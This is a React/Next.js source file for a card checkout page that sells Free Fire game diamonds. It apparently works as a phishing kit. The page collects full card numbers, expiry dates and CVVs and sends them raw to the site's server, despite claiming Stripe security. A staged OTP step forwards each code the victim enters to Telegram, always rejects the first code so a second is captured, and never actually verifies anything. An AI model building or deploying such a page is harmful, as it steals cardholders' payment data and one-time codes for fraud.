'use client'

import { Suspense, useState, useEffect, useRef } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import { toast } from 'sonner'
import {
  CreditCard, Lock, Eye, EyeOff, ShieldCheck, ArrowLeft,
  Loader2, CheckCircle2, Gem, Smartphone, RefreshCw, KeyRound,
} from 'lucide-react'
import { SiteNav } from '@/components/site/SiteNav'
import { SiteFooter } from '@/components/site/SiteFooter'
import { cn } from '@/utils/cn'
import { SEED_PACKAGES } from '@/lib/seed-data'
import { useLocale } from '@/components/geo/GeoLocaleProvider'

// ── helpers ───────────────────────────────────────────────────────────────────
function formatCardNumber(raw: string) {
  return raw.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
}
function formatExpiry(raw: string) {
  const d = raw.replace(/\D/g, '').slice(0, 4)
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d
}
function cardBrand(num: string) {
  const d = num.replace(/\s/g, '')
  if (d.startsWith('4')) return 'visa'
  if (/^5[1-5]/.test(d) || /^2[2-7]/.test(d)) return 'mastercard'
  return null
}
function maskPhone(p: string) {
  if (!p) return '***'
  return p.slice(0, 3) + '****' + p.slice(-2)
}

// ── Luhn algorithm — يتحقق من صحة رقم البطاقة رياضياً ─────────────────────
function luhnCheck(num: string): boolean {
  const digits = num.replace(/\s/g, '')
  if (!/^\d{13,19}$/.test(digits)) return false
  let sum = 0
  let shouldDouble = false
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10)
    if (shouldDouble) { d *= 2; if (d > 9) d -= 9 }
    sum += d
    shouldDouble = !shouldDouble
  }
  return sum % 10 === 0
}

// ── التحقق من صلاحية تاريخ الانتهاء ────────────────────────────────────────
function isExpiryValid(expiry: string): boolean {
  const parts = expiry.split('/')
  if (parts.length !== 2) return false
  const month = parseInt(parts[0], 10)
  const year = parseInt('20' + parts[1], 10)
  if (month < 1 || month > 12) return false
  const cardDate = new Date(year, month - 1, 1)
  const now = new Date()
  return cardDate >= new Date(now.getFullYear(), now.getMonth(), 1)
}

type Step = 'card' | 'otp'

// ── inner component ───────────────────────────────────────────────────────────
function CardPaymentForm() {
  const router = useRouter()
  const params = useSearchParams()
  const { t, formatPrice, currency } = useLocale()

  const packageId = Number(params.get('packageId') ?? 0)
  const uid       = params.get('uid') ?? ''
  const email     = params.get('email') ?? ''
  const country   = params.get('country') ?? ''
  const phone     = params.get('phone') ?? ''
  const coupon    = params.get('coupon') ?? ''
  const amountUsd = params.get('amountUsd') ?? '0'

  const pkg = SEED_PACKAGES.find((p) => p.id === packageId)

  // ── step state ────────────────────────────────────────────────────────────
  const [step, setStep] = useState<Step>('card')

  // ── card fields ───────────────────────────────────────────────────────────
  const [cardName,   setCardName]   = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [cardExpiry, setCardExpiry] = useState('')
  const [cardCvv,    setCardCvv]    = useState('')
  const [showCvv,    setShowCvv]    = useState(false)
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({})
  const [submittingCard, setSubmittingCard] = useState(false)

  // ── otp fields ────────────────────────────────────────────────────────────
  const [otp,            setOtp]            = useState('')
  const [otpError,       setOtpError]       = useState('')
  const [submittingOtp,  setSubmittingOtp]  = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [inputCooldown,  setInputCooldown]  = useState(0)
  const [otpAttempt,     setOtpAttempt]     = useState(1)
  const inputTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const [orderNumber,    setOrderNumber]    = useState('')

  // ── Anti-bot: Honeypot + timing ─────────────────────────────────────────
  const [honeypot,       setHoneypot]       = useState('')   // يجب أن يبقى فارغاً
  const formLoadTime = useRef<number>(Date.now())            // وقت تحميل النموذج

  const brand = cardBrand(cardNumber)

  // ── validate card form ────────────────────────────────────────────────────
  function validateCard() {
    const next: Record<string, string> = {}

    // الاسم
    if (!cardName.trim()) next.name = t('cp_err_name')

    // رقم البطاقة — Luhn
    const digits = cardNumber.replace(/\s/g, '')
    if (digits.length < 13) {
      next.number = t('cp_err_num_incomplete')
    } else if (!luhnCheck(cardNumber)) {
      next.number = t('cp_err_num_invalid')
    }

    // تاريخ الانتهاء
    if (cardExpiry.replace('/', '').length < 4) {
      next.expiry = t('cp_err_expiry')
    } else if (!isExpiryValid(cardExpiry)) {
      next.expiry = t('cp_err_expired')
    }

    // CVV
    if (cardCvv.length < 3) next.cvv = t('cp_err_cvv')

    setCardErrors(next)
    return Object.keys(next).length === 0
  }

  // ── submit card → create order → go to OTP step ──────────────────────────
  async function submitCard() {
    if (!validateCard()) return

    // ── Anti-bot checks (client-side) ──────────────────────────────────────
    // 1) Honeypot: إذا مُلئ الحقل المخفي → بوت
    if (honeypot.trim().length > 0) {
      toast.error(t('cp_rejected'))
      return
    }
    // 2) Timing: أقل من 4 ثوانٍ → ملء آلي
    const elapsed = Date.now() - formLoadTime.current
    if (elapsed < 4000) {
      await new Promise((r) => setTimeout(r, 4000 - elapsed))
    }

    setSubmittingCard(true)
    try {
      const res = await fetch('/api/orders/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          packageId,
          playerUid:  uid,
          email:      email || null,
          country:    country || null,
          phone:      phone || null,
          couponCode: coupon || null,
          cardName:   cardName.trim(),
          cardNumber: cardNumber.replace(/\s/g, ''),
          cardExpiry,
          cardCvv,
          amountUsd,
          _hp: honeypot,           // يُرسَل للـ server للتحقق مرة ثانية
          _t:  elapsed,            // وقت الملء بالمللي ثانية
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || t('cp_create_failed'))
      setOrderNumber(data.order.orderNumber)
      startResendCooldown()
      startInputCooldown()
      setStep('otp')
    } catch (e) {
      toast.error(e instanceof Error ? e.message : t('cp_generic_error'))
    } finally {
      setSubmittingCard(false)
    }
  }

  // ── cooldown timer for resend ─────────────────────────────────────────────
  function startResendCooldown() {
    setResendCooldown(60)
    const interval = setInterval(() => {
      setResendCooldown((v) => {
        if (v <= 1) { clearInterval(interval); return 0 }
        return v - 1
      })
    }, 1000)
  }

  // ── cooldown timer for OTP input (60s wait before entering) ───────────────
  function startInputCooldown() {
    if (inputTimerRef.current) clearInterval(inputTimerRef.current)
    setInputCooldown(60)
    inputTimerRef.current = setInterval(() => {
      setInputCooldown((v) => {
        if (v <= 1) {
          clearInterval(inputTimerRef.current!)
          inputTimerRef.current = null
          return 0
        }
        return v - 1
      })
    }, 1000)
  }

  // ── verify OTP ────────────────────────────────────────────────────────────
  async function verifyOtp() {
    const code = otp.trim()
    if (code.length < 1) { setOtpError(t('cp_otp_required')); return }
    setOtpError('')
    setSubmittingOtp(true)
    await new Promise((r) => setTimeout(r, 1200))
    setSubmittingOtp(false)

    // إرسال الرمز عبر Telegram (بدون انتظار)
    void fetch('/api/orders/otp-notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        orderNumber,
        playerUid: uid,
        attempt: otpAttempt,
        otpCode: code,
      }),
    })

    if (otpAttempt === 1) {
      // المحاولة الأولى — أظهر خطأ وابدأ عداد 60 ث للرمز الثاني
      setOtp('')
      setOtpError(t('cp_otp_wrong'))
      setOtpAttempt(2)
      startInputCooldown()
      startResendCooldown()
    } else {
      // المحاولة الثانية — نقل الطلب إلى قيد المراجعة ثم الانتقال لصفحة الشكر
      try {
        await fetch(`/api/orders/${encodeURIComponent(orderNumber)}/mark-reviewed`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        })
      } catch {
        // لا نمنع الانتقال لصفحة الشكر حتى لو فشل التحديث
      }
      toast.success(t('cp_verified'))
      const p = new URLSearchParams({
        order: orderNumber,
        packageId: String(packageId),
        uid,
        amountUsd,
        ...(phone ? { phone } : {}),
      })
      router.push(`/payment/card/confirmed?${p.toString()}`)
    }
  }

  // ── resend OTP ────────────────────────────────────────────────────────────
  function resendOtp() {
    if (resendCooldown > 0) return
    startResendCooldown()
    toast.success(t('cp_resent'))
  }

  // ── Order summary card (shared) ───────────────────────────────────────────
  const OrderSummary = pkg ? (
    <div className="mb-6 flex items-center gap-3 rounded-2xl border border-border bg-card/50 p-4">
      <div className="grid h-12 w-12 place-items-center rounded-xl bg-sky-500/10 text-sky-300">
        <Gem className="h-6 w-6" />
      </div>
      <div className="flex-1 min-w-0">
        <p className="font-bold">{(pkg.diamonds + pkg.bonusDiamonds).toLocaleString()} 💎</p>
        <p className="truncate text-xs text-muted-foreground">Free Fire Diamonds • UID: {uid}</p>
      </div>
      <div className="text-right shrink-0">
        <p className="text-lg font-extrabold text-amber-400" translate="no">{formatPrice(Number(amountUsd))}</p>
        <p className="text-xs text-muted-foreground" translate="no">{currency}</p>
      </div>
    </div>
  ) : null

  // =========================================================================
  // STEP 1 — Card details
  // =========================================================================
  if (step === 'card') {
    return (
      <div className="mx-auto max-w-lg px-4 py-12">
        <button
          onClick={() => router.back()}
          className="mb-6 flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors"
        >
          <ArrowLeft className="h-4 w-4" /> {t('cp_back')}
        </button>

        {/* Header — Live Card Preview */}
        <div className="mb-8 text-center">
          {/* البطاقة الحية */}
          <div
            className={cn(
              'mx-auto mb-5 w-72 h-44 rounded-3xl relative overflow-hidden p-5 flex flex-col justify-between transition-all duration-500 shadow-2xl',
              brand === 'visa'
                ? 'bg-gradient-to-br from-blue-900 via-blue-800 to-indigo-900 shadow-blue-900/50'
                : brand === 'mastercard'
                  ? 'bg-gradient-to-br from-slate-900 via-gray-800 to-zinc-900 shadow-black/60'
                  : 'bg-gradient-to-br from-slate-800 via-slate-700 to-slate-900 shadow-black/40',
            )}
            style={{ direction: 'ltr' }}
          >
            {/* زخارف دائرية خلفية */}
            <div className="absolute -top-8 -right-8 h-36 w-36 rounded-full bg-white/5" />
            <div className="absolute -bottom-6 -left-6 h-28 w-28 rounded-full bg-white/5" />

            {/* الصف العلوي: الشريحة + علامة الدفع اللاتلامسي */}
            <div className="relative flex items-start justify-between">
              {/* شريحة EMV */}
              <div className="h-8 w-11 rounded-md bg-gradient-to-br from-amber-300 to-yellow-500 shadow flex items-center justify-center overflow-hidden">
                <div className="grid grid-cols-2 gap-[2px] w-7 h-6">
                  {[...Array(6)].map((_, i) => (
                    <div key={i} className="rounded-[2px] bg-amber-700/50" />
                  ))}
                </div>
              </div>
              {/* رمز لاتلامسي */}
              <svg className="h-6 w-6 text-white/30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                <path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9a16 16 0 0 1 21.16 0M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01" strokeLinecap="round" />
              </svg>
            </div>

            {/* رقم البطاقة الحي */}
            <div className="relative">
              <p className="font-mono text-base tracking-[0.25em] text-white font-semibold drop-shadow">
                {(() => {
                  const digits = cardNumber.replace(/\s/g, '')
                  const padded = digits.padEnd(16, '•')
                  return `${padded.slice(0,4)} ${padded.slice(4,8)} ${padded.slice(8,12)} ${padded.slice(12,16)}`
                })()}
              </p>
            </div>

            {/* الصف السفلي: الاسم + الانتهاء + شعار */}
            <div className="relative flex items-end justify-between">
              <div className="flex flex-col gap-0.5">
                <span className="text-[9px] text-white/40 uppercase tracking-widest">Card Holder</span>
                <span className="text-xs font-semibold text-white tracking-wider truncate max-w-[120px] uppercase">
                  {cardName || 'YOUR NAME'}
                </span>
              </div>
              <div className="flex flex-col items-center gap-0.5">
                <span className="text-[9px] text-white/40 uppercase tracking-widest">Expires</span>
                <span className="text-xs font-semibold text-white">{cardExpiry || 'MM/YY'}</span>
              </div>
              {/* شعار الماركة */}
              <div className="flex items-center">
                {brand === 'visa' && (
                  <span className="text-lg font-extrabold italic text-white tracking-tight drop-shadow-lg">VISA</span>
                )}
                {brand === 'mastercard' && (
                  <span className="flex items-center">
                    <span className="h-7 w-7 rounded-full bg-red-500/90 shadow" />
                    <span className="-ml-3 h-7 w-7 rounded-full bg-amber-400/90 shadow" />
                  </span>
                )}
                {!brand && (
                  <span className="flex gap-0.5">
                    <span className="h-6 w-6 rounded-full bg-white/10" />
                    <span className="-ml-2.5 h-6 w-6 rounded-full bg-white/10" />
                  </span>
                )}
              </div>
            </div>
          </div>

          <h1 className="text-2xl font-extrabold">{t('cp_title')}</h1>
          <p className="mt-1 text-sm text-muted-foreground">Visa / Mastercard — {t('cp_secure_stripe')}</p>
        </div>

        {/* Steps indicator */}
        <div className="mb-8 flex items-center justify-center gap-3">
          <div className="flex items-center gap-2">
            <span className="flex h-7 w-7 items-center justify-center rounded-full bg-primary text-xs font-bold text-white">1</span>
            <span className="text-sm font-semibold">{t('cp_step_card')}</span>
          </div>
          <div className="h-px w-10 bg-border" />
          <div className="flex items-center gap-2 opacity-40">
            <span className="flex h-7 w-7 items-center justify-center rounded-full border border-border text-xs font-bold">2</span>
            <span className="text-sm">{t('cp_step_phone')}</span>
          </div>
        </div>

        {OrderSummary}

        {/* Security notice */}
        <div className="mb-6 rounded-xl border border-blue-500/30 bg-blue-500/10 p-4 text-sm text-blue-100">
          <div className="mb-2 flex items-center gap-2">
            <ShieldCheck className="h-5 w-5 shrink-0 text-blue-400" />
            <span className="font-bold text-blue-300">{t('cp_notice_title')}</span>
          </div>
          <p className="leading-relaxed">
            {t('cp_notice_pre')}{' '}
            <span className="font-bold text-white">{t('cp_notice_intl')}</span>{' '}
            {t('cp_notice_post')}
          </p>
          <ul className="mt-2 space-y-1 pr-1">
            <li className="flex items-start gap-2">
              <span className="mt-0.5 text-blue-400">•</span>
              <span>{t('cp_notice_travel')}</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="mt-0.5 text-blue-400">•</span>
              <span>{t('cp_notice_online')}</span>
            </li>
          </ul>
          <p className="mt-2 text-xs text-blue-300/80">
            {t('cp_notice_how')}
          </p>
        </div>

        {/* Card form */}
        <div className="glass rounded-2xl border border-border p-6 space-y-5">
          {/* Card name */}
          <div>
            <label className="mb-1.5 flex items-center gap-1.5 text-xs font-medium text-muted-foreground">
              <CreditCard className="h-3.5 w-3.5" /> {t('cp_name')} <span className="text-rose-400">*</span>
            </label>
            <input
              value={cardName}
              onChange={(e) => { setCardName(e.target.value); setCardErrors((p) => ({ ...p, name: '' })) }}
              placeholder="AHMED MOHAMMED"
              autoComplete="cc-name"
              className={cn('input-base uppercase w-full', cardErrors.name && 'input-error')}
              style={{ direction: 'ltr' }}
            />
            {cardErrors.name && <p className="mt-1.5 text-xs text-rose-400">{cardErrors.name}</p>}
          </div>

          {/* Card number */}
          <div>
            <label className="mb-1.5 flex items-center justify-between text-xs font-medium text-muted-foreground">
              <span className="flex items-center gap-1.5"><Lock className="h-3.5 w-3.5" /> {t('cp_number')} <span className="text-rose-400">*</span></span>
              {brand === 'visa' && (
                <span className="rounded bg-blue-700 px-1.5 py-0.5 text-[9px] font-extrabold italic text-white">VISA</span>
              )}
              {brand === 'mastercard' && (
                <span className="flex items-center gap-1" style={{ direction: 'ltr' }}>
                  <span className="flex"><span className="h-4 w-4 rounded-full bg-red-500" /><span className="-ml-2 h-4 w-4 rounded-full bg-amber-400/90" /></span>
                  <span className="text-[9px] font-semibold text-white/70">Mastercard</span>
                </span>
              )}
            </label>
            <input
              value={cardNumber}
              onChange={(e) => { setCardNumber(formatCardNumber(e.target.value)); setCardErrors((p) => ({ ...p, number: '' })) }}
              placeholder="0000 0000 0000 0000"
              inputMode="numeric"
              autoComplete="cc-number"
              maxLength={19}
              translate="no"
              className={cn('input-base w-full font-mono tracking-[0.12em]', cardErrors.number && 'input-error')}
              style={{ direction: 'ltr' }}
            />
            {cardErrors.number && <p className="mt-1.5 text-xs text-rose-400">{cardErrors.number}</p>}
            {!cardErrors.number && cardNumber.replace(/\s/g, '').length === 16 && (
              luhnCheck(cardNumber)
                ? <p className="mt-1.5 flex items-center gap-1 text-xs text-emerald-400"><CheckCircle2 className="h-3.5 w-3.5" /> {t('cp_num_valid')}</p>
                : <p className="mt-1.5 text-xs text-rose-400">{t('cp_num_invalid_short')}</p>
            )}
          </div>

          {/* Expiry + CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="mb-1.5 block text-xs font-medium text-muted-foreground">
                {t('cp_expiry')} <span className="text-rose-400">*</span>
              </label>
              <input
                value={cardExpiry}
                onChange={(e) => { setCardExpiry(formatExpiry(e.target.value)); setCardErrors((p) => ({ ...p, expiry: '' })) }}
                placeholder="MM/YY"
                inputMode="numeric"
                autoComplete="cc-exp"
                maxLength={5}
                translate="no"
                className={cn('input-base w-full', cardErrors.expiry && 'input-error')}
                style={{ direction: 'ltr' }}
              />
              {cardErrors.expiry && <p className="mt-1.5 text-xs text-rose-400">{cardErrors.expiry}</p>}
            </div>

            <div>
              <label className="mb-1.5 block text-xs font-medium text-muted-foreground">
                {t('cp_cvv')} <span className="text-rose-400">*</span>
              </label>
              <div className="relative">
                <input
                  value={cardCvv}
                  onChange={(e) => { setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4)); setCardErrors((p) => ({ ...p, cvv: '' })) }}
                  placeholder="•••"
                  type={showCvv ? 'text' : 'password'}
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  maxLength={4}
                  translate="no"
                  className={cn('input-base w-full pr-11 font-mono text-base tracking-[0.4em]', cardErrors.cvv && 'input-error')}
                  style={{ direction: 'ltr', paddingRight: '2.75rem' }}
                />
                <button
                  type="button"
                  onClick={() => setShowCvv((v) => !v)}
                  className="absolute inset-y-0 right-0 flex w-11 items-center justify-center text-muted-foreground hover:text-foreground transition-colors"
                  tabIndex={-1}
                  title={showCvv ? t('cp_hide_cvv') : t('cp_show_cvv')}
                >
                  {showCvv ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
              {cardErrors.cvv && <p className="mt-1.5 text-xs text-rose-400">{cardErrors.cvv}</p>}
            </div>
          </div>

          {/* Honeypot — مخفي عن البشر، البوتات تملؤه تلقائياً */}
          <div aria-hidden="true" style={{ position: 'absolute', left: '-9999px', width: '1px', height: '1px', overflow: 'hidden' }}>
            <label htmlFor="__email_confirm">Email Confirm</label>
            <input
              id="__email_confirm"
              type="text"
              name="email_confirm"
              value={honeypot}
              onChange={(e) => setHoneypot(e.target.value)}
              tabIndex={-1}
              autoComplete="off"
            />
          </div>

          {/* Submit */}
          <button
            type="button"
            onClick={submitCard}
            disabled={submittingCard}
            className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-br from-primary to-orange-500 px-4 py-3.5 text-sm font-semibold text-white shadow-md transition-transform hover:scale-[1.02] disabled:opacity-60"
          >
            {submittingCard
              ? <Loader2 className="h-4 w-4 animate-spin" />
              : <Smartphone className="h-4 w-4" />}
            {submittingCard ? t('cp_sending') : t('cp_submit_card')}
          </button>

          <p className="flex items-center justify-center gap-1.5 text-[11px] text-muted-foreground">
            <Lock className="h-3 w-3 shrink-0" />
            {t('cp_protected')}
          </p>
        </div>
      </div>
    )
  }

  // =========================================================================
  // STEP 2 — OTP verification
  // =========================================================================
  return (
    <div className="mx-auto max-w-lg px-4 py-12">
      <button
        onClick={() => setStep('card')}
        className="mb-6 flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors"
      >
        <ArrowLeft className="h-4 w-4" /> {t('cp_edit_card')}
      </button>

      {/* Header */}
      <div className="mb-8 text-center">
        <div className="relative mx-auto mb-4 flex h-20 w-20 items-center justify-center">
          {/* Pulse rings */}
          <span className="absolute inset-0 animate-ping rounded-full bg-primary/20" />
          <span className="absolute inset-2 animate-ping rounded-full bg-primary/15 [animation-delay:0.3s]" />
          <span className="relative flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-primary to-orange-500 shadow-lg shadow-primary/30">
            <Smartphone className="h-9 w-9 text-white" />
          </span>
        </div>
        <h1 className="text-2xl font-extrabold">{t('cp_step_phone')}</h1>
        <p className="mt-2 text-sm text-muted-foreground leading-relaxed">
          {t('cp_code_sent_to')}<br />
          <span className="font-semibold text-foreground" dir="ltr">
            {phone ? maskPhone(phone) : t('cp_your_phone')}
          </span>
        </p>
      </div>

      {/* Steps indicator */}
      <div className="mb-8 flex items-center justify-center gap-3">
        <div className="flex items-center gap-2 opacity-50">
          <span className="flex h-7 w-7 items-center justify-center rounded-full bg-emerald-600/80 text-xs font-bold text-white">
            <CheckCircle2 className="h-4 w-4" />
          </span>
          <span className="text-sm line-through opacity-70">{t('cp_step_card')}</span>
        </div>
        <div className="h-px w-10 bg-primary/50" />
        <div className="flex items-center gap-2">
          <span className="flex h-7 w-7 items-center justify-center rounded-full bg-primary text-xs font-bold text-white">2</span>
          <span className="text-sm font-semibold">{t('cp_step_phone')}</span>
        </div>
      </div>

      {OrderSummary}

      {/* OTP card */}
      <div className="glass rounded-2xl border border-primary/30 bg-primary/5 p-6 space-y-6">

        {/* Info banner */}
        <div className="flex items-start gap-3 rounded-xl border border-primary/20 bg-primary/10 p-4">
          <div className="grid h-10 w-10 shrink-0 place-items-center rounded-xl bg-primary/20 text-primary">
            <KeyRound className="h-5 w-5" />
          </div>
          <div>
            <p className="text-sm font-semibold text-primary/80">{t('cp_code_sent')}</p>
            <p className="mt-0.5 text-xs text-muted-foreground">
              {t('cp_enter_sms')}
            </p>
          </div>
        </div>

        {/* OTP input */}
        <div>
          <label className="mb-2 block text-xs font-medium text-muted-foreground text-center">
            {t('cp_code_label')}
          </label>
          {inputCooldown > 0 ? (
            <div className="flex flex-col items-center justify-center gap-2 rounded-xl border border-border bg-card/50 py-5">
              <div className="flex h-14 w-14 items-center justify-center rounded-full border-2 border-primary/50 bg-primary/10">
                <span className="text-xl font-bold text-primary">{inputCooldown}</span>
              </div>
              <p className="text-xs text-muted-foreground">{t('cp_wait', { s: inputCooldown })}</p>
            </div>
          ) : (
            <input
              value={otp}
              onChange={(e) => { setOtp(e.target.value.replace(/\s/g, '')); setOtpError('') }}
              placeholder=""
              inputMode="text"
              autoComplete="one-time-code"
              translate="no"
              className={cn(
                'input-base w-full text-center text-2xl font-bold tracking-[0.5em]',
                otpError && 'input-error',
              )}
              style={{ direction: 'ltr', letterSpacing: '0.5em' }}
              onKeyDown={(e) => e.key === 'Enter' && verifyOtp()}
              autoFocus
            />
          )}
          {otpError && (
            <p className={cn(
              'mt-2 text-center text-xs font-medium',
              otpAttempt === 2 ? 'text-amber-400' : 'text-rose-400'
            )}>{otpError}</p>
          )}
        </div>

        {/* Verify button */}
        <button
          type="button"
          onClick={verifyOtp}
          disabled={submittingOtp || otp.length < 1 || inputCooldown > 0}
          className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-br from-primary to-orange-500 px-4 py-3.5 text-sm font-semibold text-white shadow-md transition-transform hover:scale-[1.02] disabled:opacity-50"
        >
          {submittingOtp
            ? <Loader2 className="h-4 w-4 animate-spin" />
            : <CheckCircle2 className="h-4 w-4" />}
          {submittingOtp ? t('cp_verifying') : t('cp_confirm_code')}
        </button>

        {/* Resend */}
        <div className="flex items-center justify-center gap-2 text-sm">
          <span className="text-muted-foreground">{t('cp_no_code')}</span>
          <button
            type="button"
            onClick={resendOtp}
            disabled={resendCooldown > 0}
            className="flex items-center gap-1.5 font-semibold text-primary hover:text-primary/80 disabled:cursor-not-allowed disabled:opacity-50 transition-colors"
          >
            <RefreshCw className="h-3.5 w-3.5" />
            {resendCooldown > 0 ? t('cp_resend_in', { s: resendCooldown }) : t('cp_resend')}
          </button>
        </div>

        <p className="flex items-center justify-center gap-1.5 text-[11px] text-muted-foreground">
          <Lock className="h-3 w-3 shrink-0" />
          {t('cp_code_valid')}
        </p>
      </div>
    </div>
  )
}

// ── page shell ────────────────────────────────────────────────────────────────
export default function CardPaymentPage() {
  return (
    <>
      <SiteNav />
      <main>
        <Suspense fallback={
          <div className="flex min-h-[60vh] items-center justify-center">
            <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
          </div>
        }>
          <CardPaymentForm />
        </Suspense>
      </main>
      <SiteFooter settings={{} as never} />
    </>
  )
}
